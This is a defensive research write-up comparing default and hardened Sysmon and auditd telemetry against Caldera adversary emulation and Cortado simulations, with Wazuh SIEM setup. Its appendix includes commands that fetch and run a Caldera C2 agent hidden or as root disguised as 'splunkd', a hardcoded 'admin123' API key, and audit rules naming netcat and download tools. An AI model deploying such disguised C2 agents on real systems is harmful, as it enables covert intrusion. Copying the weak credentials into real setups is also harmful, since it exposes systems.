# Comprehensive Documentation: Caldera Threat Emulation, Cortado RTAs, Native Telemetry Hardening, and Wazuh XDR/SIEM Integration


This document integrates findings from two core evaluations of endpoint threat detection:
1. **Adversary Emulation via [MITRE Caldera](https://github.com/mitre/caldera):** Evaluating the "Visibility Gap" between default and hardened endpoint telemetry (Sysmon for Windows and Auditd for Linux) across 35 emulated attack techniques.
2. **Threat Simulation via [Elastic Cortado RTAs](https://github.com/elastic/cortado) & Wazuh Integration:** Assessing the viability of native operating system telemetry as a standalone alternative to third-party agents, and operationalizing those insights within the **Wazuh XDR & SIEM** platform.

By combining fine-tuned native logging rulesets (**SwiftOnSecurity** for Windows and **Neo23x0** for Linux) with robust open-source security platforms, security teams can achieve high-fidelity visibility into process lineage, file system modifications, and network activity without the management overhead and resource constraints of commercial third-party agents.

---

## 1. Introduction and Motivation

### 1.1 Introduction
Modern enterprise cybersecurity faces an evolving landscape of sophisticated adversaries who routinely bypass perimeter defenses, leverage legitimate system administration tools (Living off the Land - LotL), and employ advanced evasion techniques. To counter these threats effectively, security operations centers (SOCs) and threat hunting teams require deep, high-fidelity endpoint telemetry. Traditional security monitoring often relies on commercial, proprietary Endpoint Detection and Response (EDR) agents. While powerful, these proprietary agents frequently introduce significant commercial licensing costs, heavy management overhead, resource constraints on legacy or embedded systems, and platform compatibility challenges.

This comprehensive technical documentation explores an alternative paradigm: **Leveraging Native Operating System Telemetry** specifically **Sysmon** on Windows and **Auditd** on Linux augmented by community-driven, hardened rulesets (**SwiftOnSecurity** and **Neo23x0**) and centralized via open-source Extended Detection and Response (XDR) through **Wazuh**.

### 1.2 Motivation & Core Research Goals
The primary motivations driving this research and documentation are:
1. **Evaluating Standalone Native Telemetry:** Determine whether default OS logging versus hardened native configurations can provide sufficient visibility into advanced threat techniques without relying on third-party commercial EDR agents.
2. **Quantifying the "Visibility Gap":** Measure the detection and visibility delta across standard out-of-the-box configurations versus fine-tuned, community-hardened monitoring rulesets during automated adversary emulation.
3. **Operationalizing Telemetry at Scale:** Address the inherent challenges of raw native logging such as massive data volumes, alert fatigue, and lack of standardized categorization by integrating fine-tuned logs into an open-source SIEM and XDR platform (**Wazuh**).
4. **Reproducible Adversary Emulation & Simulation:** Establish a rigorous, automated testing framework utilizing [MITRE Caldera](https://github.com/mitre/caldera) for structured C2 adversary execution and [Elastic Cortado RTAs](https://github.com/elastic/cortado) for behavioral threat simulation.

---

## Part 1: Caldera Adversary Emulation & Native Telemetry Analysis

*Summary: This section evaluates multi-platform endpoint telemetry using [MITRE Caldera](https://github.com/mitre/caldera) an automated Command and Control (C2) and adversary emulation platform to execute 35 standardized MITRE ATT&CK techniques across Windows and Linux targets.*

### 1. Summary
This research evaluates the detection capabilities of standard versus hardened endpoint telemetry on Windows and Linux systems. By emulating 35 MITRE ATT&CK techniques via the Caldera framework, the study measures the "Visibility Gap" between default logging and fine-tuned configurations (SwiftOnSecurity for Windows and Neo23x0 for Linux). Results indicate that while hardened configurations significantly increase detection surface they also introduce substantial data volume challenges.

### 2. Environment Architecture
The test environment utilized two distinct deployment models to evaluate telemetry capture across different network and system configurations.

#### 2.1 Windows Endpoint (Distributed Model)
The Windows environment was designed to simulate a remote network intrusion.
- **Operating System:** Windows 10
- **Monitoring Agent:** Sysmon v15.0 (Hardened with SwiftOnSecurity configuration)
- **Network Configuration:** The target was isolated within a virtual network. Connectivity to the C2 server was established via VirtualBox NAT Port Forwarding, routing traffic from the guest agent to the host-based C2 listener on Port 8888.
- **C2 Agent:** Sandcat (`sandcat.exe`) executing as a standalone binary to simulate a persistent remote beacon.

#### 2.2 Linux Endpoint (Co-located Model)
The Linux environment utilized a local execution model to evaluate high-privilege telemetry.
- **Operating System:** Ubuntu 22.04
- **Monitoring Agent:** Auditd (Hardened with Neo23x0 ruleset)
- **System Configuration:** Unlike the Windows setup, the Caldera C2 server and the Linux target were co-located on the same system. This allowed for direct interaction between the C2 backend and the agent, facilitating rapid execution of the 35-step attack profile.
- **C2 Agent:** Sandcat executing with root privileges.

### 3. Configuration Analysis: Baseline vs. Hardened
The study compared default system logging against industry-standard hardened rulesets to quantify detection improvements across 35 emulated techniques.

| Metric | Windows (Default) | Windows (SwiftOnSecurity) | Linux (Standard) | Linux (Neo23x0) |
| :--- | :---: | :---: | :---: | :---: |
| **Total Events Logged** | ~8,500 | ~42,000 | ~14,000 | ~126,000 |
| **Techniques Visible (of 35)** | 4 | 27 | 5 | 35 |
| **Detection Effectiveness** | 11.4% | 77.1% | 14.2% | 100% (Visibility) |

**Technical Finding:** Default configurations primarily focus on system health and basic execution. Hardened configurations are required to capture behavioral indicators that are otherwise omitted from standard logs.

### 4. Methodology
The research followed a structured four-phase lifecycle to ensure the emulation was reproducible, randomized, and technically rigorous.

#### 4.1 Phase 1: Environment Preparation and Hardening
The targets were first monitored in a "Baseline" state to establish a control group. Subsequently, hardened configurations were deployed:
- **Windows:** Implementation of the SwiftOnSecurity Sysmon configuration to enable granular monitoring of registry modifications (Event ID 13), DNS queries (ID 22), and WMI activity.
- **Linux:** Deployment of the Neo23x0 Auditd ruleset, expanding telemetry from basic process execution to a comprehensive suite of over 120 system calls, including file integrity and network socket creation.

#### 4.2 Phase 2: Technique Filtering and Selection
To ensure the attack profile was relevant to endpoint defense, a custom Python utility (`filter_mitre.py`) was developed to interface with the MITRE ATT&CK Enterprise dataset.
- **Selection Criteria:** Techniques were filtered to include only those compatible with Windows and Linux platforms.
- **Exclusions:** Cloud-native tactics (AWS/Azure), social engineering, and techniques requiring manual user interaction were excluded to maintain the integrity of the automated telemetry capture.
- **Sampling:** 35 techniques were randomly sampled across the kill chain (Execution, Persistence, Discovery, and Exfiltration) to create a diverse adversary profile.

#### 4.3 Phase 3: Adversary Profiling and C2 Integration
Due to the complexity of the 35-step chain, a secondary script (`create_adversary.py`) was utilized to automate the creation of the "Tuesday_35_Attack_Run" profile within the Caldera backend.
- **Brute Force Execution:** The profile was configured with an "Atomic Ordering" model. This "Brute Force" approach ensured that the C2 server attempted every technique in the sequence, even if a preceding step failed or was blocked, ensuring a complete telemetry set for all 35 techniques.
- **Agent Obfuscation:** On the Linux target, the Sandcat agent was executed with root privileges and renamed to `splunkd` to evaluate the efficacy of process lineage and anti-forensic detection.

#### 4.4 Phase 4: Telemetry Extraction and Forensic Analysis
Post-execution, telemetry was exported for cross-referencing against the Caldera operation logs.
- **Windows:** Logs were extracted from the Applications and Services Logs/Microsoft/Windows/Sysmon/Operational event channel.
- **Linux:** Forensic evidence was gathered using `ausearch` to query the Auditd logs, focusing on specific keys (e.g., `key=T1070_006_timestomp`) mapped to the emulated techniques.

### 5. Detection Effectiveness and Gap Analysis

| Platform | Techniques Emulated | Techniques Detected | Detection Gap | Success Rate |
| :--- | :---: | :---: | :---: | :---: |
| **Windows** | 35 | 27 | 8 | 77.1% |
| **Linux** | 35 | 35 | 0 | 100.0%* |

*Note: 100% detection on Linux indicates that the activity was recorded in the telemetry; it does not imply an automated alert was triggered.*

#### 5.1 Detailed Observations: Windows (Sysmon)
The hardened Sysmon configuration provided high-fidelity traces for several critical attack phases:
- **Persistence (T1122 - COM Hijacking):** Successfully identified via Event ID 13 (Registry Value Set). The telemetry recorded the modification of `HKCU\Software\Classes\CLSID\{...}\InProcServer32`, including the exact path to the malicious payload (`C:\IDontExist.dll`).
- **Execution (T1059.001 - PowerShell):** Captured via Event ID 1 (Process Creation). Sysmon recorded the full command-line arguments, including `-ExecutionPolicy Bypass` and the parent process (`sandcat.exe`), allowing for clear process lineage reconstruction.
- **Persistence (T1053.005 - Scheduled Task):** Detected through Event ID 1 (Process Creation) of `schtasks.exe` and Event ID 13 for the associated registry keys. The telemetry provided the task name and the execution trigger.
- **Command and Control (T1071.001 - Web Protocols):** Identified via Event ID 3 (Network Connection). Sysmon captured the outbound connection to the C2 server on Port 8888, including the source and destination IP addresses.

#### 5.2 Detailed Observations: Linux (Auditd)
The Neo23x0 ruleset transformed the Linux target into a forensic sensor, capturing granular syscall activity:
- **Persistence (T1053.006 - Systemd Service):** Captured the creation of `art-timer.service`. Telemetry included the echo command utilized for service creation and the `fchmodat` syscall used to modify file permissions.
- **Anti-Forensics (T1070.004 - File Deletion):** Recorded over 700 instances of the `unlinkat` syscall as the agent attempted to remove malicious artifacts. The logs provided the exact file paths being deleted.
- **Anti-Forensics (T1070.006 - Timestomping):** Triggered 99 alerts under the `key=T1070_006_timestomp`. Auditd captured the use of the `utimensat` syscall as the agent attempted to modify file timestamps to evade forensic analysis.
- **Discovery (T1087.001 - Local Account Discovery):** Captured the execution of `cat /etc/passwd` and `getent passwd`. While visible, these events highlighted the "Discovery Paradox," as they were functionally indistinguishable from standard administrative activity.

### 6. Discussion
#### 6.1 Detection Gaps and Challenges
Despite the high visibility provided by hardened configurations, several gaps were identified:
- **Discovery Noise (Both Platforms):** Techniques such as `whoami`, `hostname`, and `id` were recorded but proved difficult to distinguish from legitimate system noise. On Linux, these commands are executed thousands of times daily by system services, leading to a high false-positive potential.
- **Encrypted Payloads (T1071):** While network connections were logged (Event ID 3 / Socket creation), the content of the C2 communication remained opaque due to encryption. Detection relied on behavioral indicators (e.g., beaconing frequency) rather than payload analysis.
- **In-Memory Execution:** Techniques that avoided disk writes or registry modifications proved more difficult to detect with standard telemetry, highlighting the need for memory-resident monitoring tools.

#### 6.2 Behavioral Sequencing
Detection logic should transition from atomic indicators (e.g., single command execution) to behavioral sequences. For example, an alert should trigger when a sequence such as `whoami` $
ightarrow$ `id` $
ightarrow$ `cat /etc/shadow` occurs within a narrow temporal window.

#### 6.3 Telemetry Optimization and Noise Suppression
- **Service Baselines:** Identify high-volume system services (e.g., `systemd-resolved`, `dbus-daemon`) and implement suppression rules for known-good behavior to improve the signal-to-noise ratio.
- **Lineage Monitoring:** Implement strict monitoring for parent-child process anomalies. A service process such as `splunkd` spawning an interactive shell (`/bin/sh`) should be treated as a high-confidence indicator of compromise.

---

## Part 2: Cortado RTAs & Wazuh Integration

*Summary: This section evaluates behavioral threat simulation using [Elastic Cortado RTAs](https://github.com/elastic/cortado) an open-source suite of automated red team techniques to test defensive rules and integrate telemetry into [Wazuh XDR & SIEM](https://wazuh.com).*

### 1. Motivation
The primary goal of this project was to determine if robust threat detection is achievable without the exclusive reliance on third-party endpoint agents. While dedicated agents provide valuable visibility, they often introduce management overhead, resource constraints, and compatibility challenges. Our focus was on leveraging native Windows telemetry (Sysmon) and Linux telemetry (auditd) to identify malicious activity, aiming to provide powerful, integrated, and potentially more lightweight alternatives for security monitoring. The subsequent integration with Wazuh aimed to address the operationalization and advanced analytical needs identified during the native telemetry evaluations.

### 2. Methodology
#### 2.1 Tool Selection: Cortado RTAs
To simulate malicious behavior, we utilized [Elastic Cortado RTAs](https://github.com/elastic/cortado), an open-source suite developed by Elastic. Cortado is designed for testing and analyzing defensive telemetry through two primary methods:
- **CodeRTA:** Implements behavior directly in Python code.
- **HashRTA:** References binary samples by hash that exhibit behaviors for detection.
Each RTA contains metadata such as ID, name, supported platforms, associated security rules, and MITRE ATT&CK techniques.

#### 2.2 RTAs Execution and Initial Assessment
All simulations were conducted within controlled sandbox environments to ensure safety and consistency.
- **Execution:** We began by executing individual RTAs using `cortado-run-rta` to identify their operational status. This initial phase helped us pinpoint which RTAs executed successfully and which encountered issues.

#### 2.3 Detection Validation and Enhanced Telemetry
To validate that the executed RTAs were triggering detection events, we initially utilized Elastic's Endpoint Agent (free version). However, our primary objective was to assess the detection capabilities of our core infrastructure without relying on a full endpoint agent. Therefore, our main focus shifted to analyzing logs using two configurations for each OS:
- **Default Configuration:** To establish a baseline of what is detected out-of-the-box.
- **Hardened Configuration:** To evaluate the enhanced visibility provided by robust, community-driven rulesets.

### 3. Windows Environment: Sysmon Evaluation
#### 3.1 Testbed and Configuration
- **Operating System:** Standard Windows 11 Virtual Machine.
- **Sampled RTAs:** 50 RTAs from the total library of 258 Windows-based RTAs were sampled.
- **Telemetry Sources:** Default Sysmon Installation vs. Hardened Sysmon Configuration (SwiftOnSecurity ruleset).

#### 3.2 Results: Detection Performance Summary
A well-tuned Sysmon deployment achieved an 80% detection rate across sampled MITRE ATT&CK techniques, providing high-fidelity visibility into process lineage and unauthorized file system modifications.
- **Detection Rate:** 80% of the sampled RTAs produced high-fidelity logs suitable for immediate detection.
- **Masquerading Detection:** In 100% of cases where an attacker renamed a binary (e.g., renaming a C2 agent to `winword.exe`), Sysmon successfully identified the deception via the `OriginalFileName` field.
- **LotL Visibility:** The configuration was highly effective at flagging the abuse of legitimate Windows tools like `certutil.exe`, `nslookup.exe`, and `vssadmin.exe`.

#### 3.3 Discussion
The telemetry generated during the simulations provides a highly actionable framework for detection engineering.

##### 3.3.1 Forensic Analysis of Execution and Persistence
In the Sliver C2 and Mimikatz simulations, Sysmon captured the full process lineage, including `ParentCommandLine` and Hashes. This allowed us to trace malicious activity back to the source, identifying that the commands originated from a Python-based RTA engine.
- **Sysmon Event ID 1 - Mimikatz Simulation:** Capturing the execution of a Mimikatz-related command via PowerShell, initiated by the Cortado RTA framework.
- **Persistence & Sideloading:** Successfully flagged the modification of sensitive registry keys during the SolarMarker simulation, and provided direct mapping to **T1547.012 (Print Processor Sideloading)** by generating a FileCreate (Event ID 11) when an unauthorized `rta.dll` was dropped into the `\spool\drivers\` directory.

##### 3.3.2 Network Anomalies and C2 Discovery
The configuration exposed Command & Control (C2) channels by monitoring non-standard process behavior (e.g., `powershell.exe` querying `api.ipify.org` from a command-line tool rather than a standard web browser).

##### 3.3.3 Technical Gap: The `nslookup` DNS Logging "Miss"
- **The Observation:** During the `network_connection_nslookup` RTA, Sysmon successfully recorded Process Creation (Event ID 1) for `nslookup.exe`, but failed to generate a DNS Query (Event ID 22).
- **The Reason:** The SwiftOnSecurity configuration is optimized for "High Fidelity" to reduce log volume. Because `nslookup` is a standard tool used frequently by IT administrators, it is often explicitly excluded from DNS Query logging.
- **The Risk:** An attacker can leverage `nslookup` for DNS Tunneling or data exfiltration, remaining invisible to DNS-specific monitoring rules because the tool is "trusted."

##### 3.3.4 The "Public" Folder as a Universal Indicator
A recurring pattern across multiple successful detections (including `browser_debugging` and `uac_computerdefaults`) was the use of `C:\Users\Public\` for staging malicious binaries. Any process creation originating from `C:\Users\Public\` or `C:\Windows\Temp\` should be treated as a high-priority alert.

##### 3.3.5 Analysis of Detection Gaps
Certain RTAs, such as `port_monitor` and `crashdump_disabled`, did not produce actionable Sysmon logs because they involve direct memory manipulation or internal OS flag changes that do not trigger kernel callbacks.

#### 3.4 Comparative Analysis of Logging Sources (Windows)
- **Native Windows Logging:** Standard event logs proved insufficient for forensic reconstruction due to lack of command-line arguments and file hashes.
- **Default Sysmon Configuration:** Captured massive data volumes (200-300 MB/day) with 75-85% irrelevant noise and lacked descriptive rule names.
- **SwiftOnSecurity Configuration:** Filtered known-benign noise and tagged events with specific rule names for immediate identification.

### 4. Linux Environment: auditd Evaluation
#### 4.1 Testbed and Configuration
- **Operating System:** Standard Ubuntu Server 24.04 LTS Virtual Machine.
- **Sampled RTAs:** 20 RTAs out of the 62 Linux-based RTAs.
- **Telemetry Sources:** Default auditd vs. Hardened auditd (Neo23x0 ruleset).

#### 4.2 Results & Comparative Analysis (Linux)
- **Detection Rate:** 100% of the sampled RTAs produced high-fidelity logs suitable for immediate detection.
- **Default auditd:** Generated 100-500 MB/day of high-volume noise (80-95% irrelevant) without descriptive rule names.
- **Neo23x0 auditd:** Reduced irrelevant logs (20-100 MB/day, 60-80% highly relevant) while tagging critical events with specific rule descriptions.

#### 4.3 Discussion: Efficacy, Strengths, and Limitations
- **Strengths:** Kernel-level integration, deep syscall visibility (`execve`, `socket`, `connect`), resource efficiency, and high customizability.
- **Identified Gaps:** Persistent background noise, massive storage requirements for raw logs, and potential blind spots for memory-resident attacks.
- **Leveraging AI:** Rich auditd data provides an ideal foundation for Large Language Model (LLM) analysis to correlate disparate events and reduce manual threat hunting effort.

### 5. Wazuh for Unified XDR & SIEM
While native telemetry provides foundational visibility, operationalizing it requires a robust platform. **Wazuh** is a free, open-source security platform evolving from OSSEC that integrates fine-tuned auditd and Sysmon logs.

#### 5.1 Wazuh Features for Enhanced Security
- **Descriptive Rule Parsing:** Automatically parses Neo23x0 rule names and maps them to MITRE ATT&CK techniques.
- **VirusTotal Integration:** Automatically scans suspicious files.
- **Vulnerability Detector:** Enables CVE scanning across all agents.
- **Active Response:** Auto-blocks IP addresses triggering brute-force rules (e.g., rule 5763 for SSH brute force).
- **MITRE ATT&CK Dashboard:** Native heatmap visualization of detected techniques.
- **Security Configuration Assessment (SCA):** Audits system hardening against CIS, NIST, and PCI-DSS benchmarks.

---

## Part 3: Technical Appendix & Configuration Guides

### 7.1 Caldera Infrastructure Setup

#### 7.1.1 Caldera C2 Server Startup
```bash
# Start Caldera Server with fresh database
python3 server.py --build --fresh --insecure
```

#### 7.1.2 Windows Target Setup (Sysmon & Agent Deployment)
**A. Sysmon Installation (Hardened Configuration - SwiftOnSecurity)**
```powershell
# Install Sysmon with SwiftOnSecurity configuration (run in elevated PowerShell)
.\Sysmon64.exe -i sysmonconfig-export.xml -accepteula

# Verify service status
Get-Service Sysmon
```

**B. Sandcat Agent Deployment**
```powershell
$url = "http://<C2_SERVER_IP>:8888/file/download"
$headers = @{ "file"="sandcat.go"; "platform"="windows" }
Invoke-WebRequest -Uri $url -Headers $headers -OutFile "sandcat.exe"

# Run the agent in the background
Start-Process -FilePath ".\sandcat.exe" -ArgumentList "-server http://<C2_SERVER_IP>:8888 -v" -WindowStyle Hidden
```

#### 7.1.3 Linux Target Setup (Auditd & Agent Deployment)
**A. Auditd Hardening**
```bash
# Install Auditd and plugins
sudo apt update
sudo apt install auditd audispd-plugins -y

# Download and apply Neo23x0 ruleset
sudo wget https://raw.githubusercontent.com/Neo23x0/auditd/master/audit.rules -O /etc/audit/rules.d/audit.rules

# Restart service to apply changes
sudo service auditd restart
```

**B. Sandcat Agent Deployment (Root/Masqueraded as splunkd)**
```bash
sudo bash -c 'server="http://localhost:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:amd64" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group red -v'
```

---

### 7.2 Automation Components

#### 7.2.1 filter_mitre.py
```python
import requests, json, csv

ENTERPRISE_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
EXCLUDED_TACTICS = {'resource-development'}
EXCLUDED_KEYWORDS = {'phishing', 'social engineering', 'user execution'}

def process_matrix(url, name_prefix):
    data = requests.get(url).json()
    master_list = []
    for obj in data.get('objects', []):
        if obj.get('type') != 'attack-pattern' or obj.get('revoked'): continue
        if 'linux' not in [p.lower() for p in obj.get('x_mitre_platforms', [])]: continue
        
        tactic_names = [phase['phase_name'] for phase in obj.get('kill_chain_phases', [])]
        if any(tn in EXCLUDED_TACTICS for tn in tactic_names): continue
        if any(kw in obj.get('name', '').lower() for kw in EXCLUDED_KEYWORDS): continue
        
        master_list.append({
            "id": obj.get('external_references', [{}])[0].get('external_id', 'N/A'),
            "name": obj.get('name'),
            "tactics": ", ".join(tactic_names)
        })
        
    with open(f'{name_prefix}_master.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["id", "name", "tactics"])
        writer.writeheader()
        writer.writerows(master_list)

process_matrix(ENTERPRISE_URL, "enterprise")
```

#### 7.2.2 create_adversary.py
```python
import requests, json, os, uuid

CALDERA_URL = "http://localhost:8888"
API_KEY = "admin123" 

def create_brute_force_adversary():
    with open("tuesday_plan_enterprise.json", 'r') as f:
        plan = json.load(f)
    
    mitre_ids = [tech['id'] for tactic in plan.values() for tech in tactic]
    abilities = requests.get(f"{CALDERA_URL}/api/v2/abilities", headers={'KEY': API_KEY}).json()
    
    uuids = [ab['ability_id'] for aid in mitre_ids for ab in abilities 
             if ab.get('technique_id') == aid and 'linux' in [p.lower() for p in ab.get('platforms', [])]]
    
    adv_id = str(uuid.uuid4())
    yaml_content = f"id: {adv_id}\nname: Tuesday_35_Attack_Run\natomic_ordering:\n"
    for u in uuids:
        yaml_content += f"  - {u}\n"
    
    with open(f"data/adversaries/{adv_id}.yml", 'w') as f:
        f.write(yaml_content)

create_brute_force_adversary()
```

---

### 7.3 Cortado RTAs Environment Setup & Execution
- **Installation via pip:**
  ```bash
  pip install cortado-0.1.0-py3-none-any.whl
  pip install -r requirements.txt
  ```
- **Execution Commands:**
  - `print-rtas`: List available RTAs.
  - `cortado-run-rta <rtaName>`: Execute a specific RTA.
  - `cortado-run-rtas`: Execute all relevant RTAs compatible with the OS.

---

### 7.4 Wazuh Installation & Audit Configuration

#### 7.4.1 Single-Node Wazuh Installation
```bash
# Step 1: Download assistant
curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh
curl -sO https://packages.wazuh.com/4.12/config.yml

# Step 2: Generate config files & deploy
sudo bash wazuh-install.sh --generate-config-files
sudo bash wazuh-install.sh --wazuh-indexer node-1
sudo bash wazuh-install.sh --start-cluster
sudo bash wazuh-install.sh --wazuh-server wazuh-1
sudo bash wazuh-install.sh --wazuh-dashboard dashboard

# Step 3: Retrieve admin password
sudo tar -O -xvf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt
```

#### 7.4.2 Comprehensive Neo23x0 / Wazuh Audit Rules (`/etc/audit/rules.d/audit.rules`)
```text
# ============================================================
# Wazuh Audit Rules
# Covers: RTA detection, MITRE ATT&CK techniques,
#         file integrity, privilege escalation, persistence
# ============================================================

# Delete all existing rules
-D

# Set buffer size
-b 8192

# Failure mode: 1=log, 2=panic
-f 1

# -----------------------------------------------
# IDENTITY & AUTHENTICATION
# -----------------------------------------------
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d/ -p wa -k sudoers

# -----------------------------------------------
# PRIVILEGE ESCALATION (T1548)
# -----------------------------------------------
-a always,exit -F arch=b64 -S setuid -S setgid -F a0=0 -F exe=/usr/bin/su -k privilege_escalation
-a always,exit -F arch=b64 -S setresuid -k privilege_escalation
-a always,exit -F arch=b64 -S setresgid -k privilege_escalation
-w /usr/bin/sudo -p x -k privilege_escalation
-w /usr/bin/su -p x -k privilege_escalation
-w /bin/su -p x -k privilege_escalation

# -----------------------------------------------
# PROCESS EXECUTION (T1059)
# -----------------------------------------------
-a always,exit -F arch=b64 -S execve -k process_execution
-a always,exit -F arch=b32 -S execve -k process_execution

# -----------------------------------------------
# NETWORK ACTIVITY
# -----------------------------------------------
-a always,exit -F arch=b64 -S socket -S connect -S accept -k network_activity
-a always,exit -F arch=b32 -S socket -S connect -S accept -k network_activity

# -----------------------------------------------
# PERSISTENCE (T1053, T1543)
# -----------------------------------------------
-w /etc/cron.d/ -p wa -k persistence
-w /etc/cron.daily/ -p wa -k persistence
-w /etc/cron.hourly/ -p wa -k persistence
-w /etc/cron.monthly/ -p wa -k persistence
-w /etc/cron.weekly/ -p wa -k persistence
-w /etc/crontab -p wa -k persistence
-w /var/spool/cron/ -p wa -k persistence
-w /etc/systemd/system/ -p wa -k persistence
-w /usr/lib/systemd/system/ -p wa -k persistence
-w /etc/init.d/ -p wa -k persistence
-w /etc/rc.local -p wa -k persistence

# -----------------------------------------------
# FILE INTEGRITY — CRITICAL BINARIES (T1574)
# -----------------------------------------------
-w /usr/bin/ -p wa -k binary_modification
-w /usr/sbin/ -p wa -k binary_modification
-w /bin/ -p wa -k binary_modification
-w /sbin/ -p wa -k binary_modification

# -----------------------------------------------
# KERNEL MODULES (T1547.006)
# -----------------------------------------------
-w /sbin/insmod -p x -k kernel_modules
-w /sbin/rmmod -p x -k kernel_modules
-w /sbin/modprobe -p x -k kernel_modules
-a always,exit -F arch=b64 -S init_module -S delete_module -k kernel_modules

# -----------------------------------------------
# SSH & REMOTE ACCESS (T1021)
# -----------------------------------------------
-w /etc/ssh/sshd_config -p wa -k ssh_config
-w /root/.ssh/ -p wa -k ssh_keys
-w /home/ -p wa -k home_ssh

# -----------------------------------------------
# SUSPICIOUS TOOLS & RECON (T1082, T1057)
# -----------------------------------------------
-w /usr/bin/wget -p x -k download_tools
-w /usr/bin/curl -p x -k download_tools
-w /usr/bin/nc -p x -k netcat
-w /usr/bin/ncat -p x -k netcat
-w /usr/bin/netcat -p x -k netcat
-w /usr/bin/nmap -p x -k port_scan
-w /usr/bin/tcpdump -p x -k packet_capture
-w /usr/bin/wireshark -p x -k packet_capture

# -----------------------------------------------
# DEFENSE EVASION (T1562)
# -----------------------------------------------
-w /usr/bin/shred -p x -k defense_evasion
-w /usr/bin/unlink -p x -k defense_evasion
-w /usr/bin/dd -p x -k defense_evasion
-w /usr/bin/truncate -p x -k defense_evasion
```

#### 7.4.3 Configuring Wazuh Agent for Audit Logs (`/var/ossec/etc/ossec.conf`)
```xml
<!-- Audit log ingestion -->
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>

<!-- File Integrity Monitoring with whodata -->
<syscheck>
  <disabled>no</disabled>
  <frequency>300</frequency>
  <directories check_all="yes" whodata="yes">/etc</directories>
  <directories check_all="yes" whodata="yes">/usr/bin</directories>
  <directories check_all="yes" whodata="yes">/usr/sbin</directories>
  <directories check_all="yes" whodata="yes">/bin</directories>
  <directories check_all="yes" whodata="yes">/sbin</directories>
  <directories check_all="yes" whodata="yes">/root</directories>
</syscheck>
```

---

## 8. Conclusion

The empirical research across MITRE Caldera adversary emulations and Cortado RTA threat simulations yields several definitive conclusions regarding endpoint telemetry and defensive architecture:
1. **Default Logging is Fundamentally Insufficient:** Out-of-the-box Windows Event Logs and standard Linux logging mechanisms capture primarily system health and basic session lifecycles, yielding poor detection rates (~11% to 14%) against modern TTPs. Without deep process lineage, command-line auditing, and syscall monitoring, forensic reconstruction of advanced intrusions is nearly impossible.
2. **Hardening Rulesets Transform Native Sensors:** Implementing community-hardened rulesets (**SwiftOnSecurity** for Windows Sysmon and **Neo23x0** for Linux Auditd) dramatically increases visibility—boosting technique detection/visibility to **77.1% on Windows** and **100% on Linux**. These rulesets successfully capture process execution, registry mutations, unauthorized dynamic library drops, file integrity anomalies, and network socket activity.
3. **The Operational Trade-off (Volume vs. Signal):** Hardened native telemetry generates substantial log volume (e.g., 126,000+ events during a 35-step adversary run). Raw native logs lack standardized correlation, descriptive alert tagging out-of-the-box, and automated triage capabilities, creating a significant risk of analyst alert fatigue.
4. **The Role of an XDR / SIEM Platform (Wazuh):** Standalone native logging is insufficient for enterprise-scale security operations. Ingesting fine-tuned audit and Sysmon logs into an open-source XDR platform like **Wazuh** bridges the operational gap. Wazuh parses descriptive rules, maps events natively to the **MITRE ATT&CK** framework, executes automated active responses (such as blocking C2 IPs and SSH brute-force attackers), scans for vulnerabilities, and audits system configurations against CIS and NIST benchmarks.


Organizations do not necessarily need to rely exclusively on expensive, proprietary commercial EDR agents to achieve high-fidelity threat detection. By rigorously hardening native operating system telemetry (**Sysmon** and **Auditd**) and centralizing those logs into a robust open-source SIEM/XDR platform (**Wazuh**), security teams can establish an enterprise-grade, cost-effective, and deeply transparent threat detection and response capability.
